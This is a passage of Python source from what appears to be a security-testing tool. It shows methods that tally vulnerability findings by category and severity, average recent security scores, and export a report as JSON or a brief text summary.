        return mutation_func(payload_data) if mutation_func else payload_data
    
    def get_testing_statistics(self) -> Dict[str, Any]:
        """Get security testing statistics"""
        if not self.test_history:
            return {"status": "No security tests performed"}
        
        total_tests = len(self.test_history)
        total_vulnerabilities = sum(len(report.vulnerabilities_found) for report in self.test_history)
        
        # Category statistics
        category_stats = {}
        for report in self.test_history:
            for vuln in report.vulnerabilities_found:
                category = vuln.category.value
                if category not in category_stats:
                    category_stats[category] = {"count": 0, "severities": {}}
                
                category_stats[category]["count"] += 1
                severity = vuln.severity.value
                category_stats[category]["severities"][severity] = category_stats[category]["severities"].get(severity, 0) + 1
        
        # Recent security scores
        recent_scores = [report.security_score for report in self.test_history[-10:]]
        avg_security_score = sum(recent_scores) / len(recent_scores) if recent_scores else 0
        
        return {
            "total_security_tests": total_tests,
            "total_vulnerabilities_found": total_vulnerabilities,
            "average_security_score": round(avg_security_score, 1),
            "category_statistics": category_stats,
            "false_positives_in_db": len(self.false_positive_db),
            "latest_test": asdict(self.test_history[-1]) if self.test_history else None
        }
    
    def export_security_report(self, report: SecurityTestReport, format_type: str = "json") -> str:
        """Export security report in various formats"""
        if format_type == "json":
            return json.dumps(asdict(report), indent=2, default=str)
        elif format_type == "summary":
            summary = f"Security Test Report - Score: {report.security_score}/100\n"
            summary += f"Vulnerabilities: {len(report.vulnerabilities_found)}\n"
            summary += f"Categories tested: {len(report.categories_tested)}\n"
            return summary
        else:
            return f"Security Report - {len(report.vulnerabilities_found)} vulnerabilities, Score: {report.security_score}/100"